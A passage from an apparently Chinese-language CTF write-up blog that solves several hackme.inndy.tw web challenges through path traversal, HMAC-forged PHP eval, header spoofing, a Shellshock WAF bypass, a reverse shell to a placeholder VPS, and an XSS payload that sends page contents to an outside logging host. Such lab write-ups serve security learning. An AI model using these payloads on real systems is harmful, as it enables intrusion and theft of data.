$s_item);</span><br></pre></td></tr></table></div></figure><p>函数中有三条过滤</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></div></figure><p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'help'</span>] == <span class="string">'me'</span>) &#123;</span><br><span class="line">        $_COOKIE[<span class="string">'help'</span>] = <span class="keyword">null</span>;</span><br><span class="line">        setcookie(<span class="string">'help'</span>, <span class="string">''</span>, time() - <span class="number">9999999999</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Very good. You know how to create cookie. How about tamper a cookie?")&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">'show_hidden'</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">'show_hidden'</span>, <span class="string">'no'</span>, time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($item, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span> &amp;&amp; $GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span> &amp;&amp; $_COOKIE[<span class="string">'show_hidden'</span>] != <span class="string">'yes'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"no_access"</span>] != <span class="string">""</span> &amp;&amp; @eregi($GLOBALS[<span class="string">"no_access"</span>], $item)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">        <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p><p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></div></figure><p>于是可以读到目标文件</p><p><img src="/2020/09/13/hackme-1/3.png" alt=".htusers.php"></p><p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p>        <h1 id="dafuq-manager-3">          <a href="#dafuq-manager-3" class="heading-link"><i class="fas fa-link"></i></a>dafuq-manager 3</h1>      <p>题目给出了信息</p><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>所以我们可以自己生成command</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3"</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(make_command(<span class="string">'$a=\'sys\';$b=\'tem\';$c=$a.$b;$c(base64_decode(\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\'));'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></div></figure><p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p>        <h1 id="wordpress-1">          <a href="#wordpress-1" class="heading-link"><i class="fas fa-link"></i></a>wordpress 1</h1>      <p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line"><span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"><span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag</span><br></pre></td></tr></table></div></figure><p>查看元素即可找到flag</p>        <h1 id="wordpress-2">          <a href="#wordpress-2" class="heading-link"><i class="fas fa-link"></i></a>wordpress 2</h1>      <p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- debug:<span class="meta">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class="string">'post_'</span>.(string)($_GET[<span class="string">'debug'</span>]?:<span class="string">'type'</span>)&#125;); <span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></div></figure><p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content</span><br></pre></td></tr></table></div></figure>        <h1 id="command-executor">          <a href="#command-executor" class="heading-link"><i class="fas fa-link"></i></a>command-executor</h1>      <p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></div></figure><p>base64解码一下得到源代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p><blockquote><p><span class="exturl"><a class="exturl__link" href="http://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/45390.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>国外有一个漏洞利用的文章，</p><blockquote><p><span class="exturl"><a class="exturl__link" href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p><img src="/2020/09/13/hackme-1/4.png" alt="exp"></p><p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;\(\)\s*\&#123;\s*:;\s*\&#125;;&#39;</span><br></pre></td></tr></table></div></figure><p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\/flag</code> 我们可以利用通配符绕过，</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></div></figure><p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p><p><img src="/2020/09/13/hackme-1/5.png" alt></p><p>但是题目中有一个flag-reader文件，我们尝试读取一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></div></figure><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setuid(<span class="number">1337</span>);</span><br><span class="line">seteuid(<span class="number">1337</span>);</span><br><span class="line">alarm(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="built_in">read</span>(fd, buff, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, buff, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></div></figure><p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat content</span><br></pre></td></tr></table></div></figure>        <h1 id="xssme">          <a href="#xssme" class="heading-link"><i class="fas fa-link"></i></a>xssme</h1>      <p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></div></figure><p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p><p><img src="/2020/09/13/hackme-1/7.png" alt="payload"></p><p>然后在自己的ceve账号中收到回显</p><p><img src="/2020/09/13/hackme-1/6.png" alt="回显"></p>        <h1 id="xssrf-leak">          <a href="#xssrf-leak" class="heading-link"><i class="fas fa-link"></i></a>xssrf leak</h1>      <p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p><blockquote><p>Admin only allowed from localhost, but you came from 192.168.123.1</p></blockquote><p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></div></figure><p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 